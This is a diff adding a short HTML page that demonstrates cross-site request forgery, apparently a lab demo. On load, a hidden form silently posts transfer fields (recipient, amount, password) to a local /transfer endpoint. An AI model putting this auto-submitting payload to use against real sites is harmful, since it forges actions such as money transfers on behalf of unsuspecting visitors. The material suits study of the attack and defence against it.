@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>csrf</title>
+</head>
+<body>
+    <h1>...上线了</h1>
+    <form action="http://localhost:3000/transfer" method="post">
+        <input type="hidden" name="转给谁">
+        <input type="hidden" name="多少钱">
+        <input type="hidden" name="你的密码">
+    </form>
+    <script>
+        document.forms[0].submit()
+    </script>
+</body>
+</html>
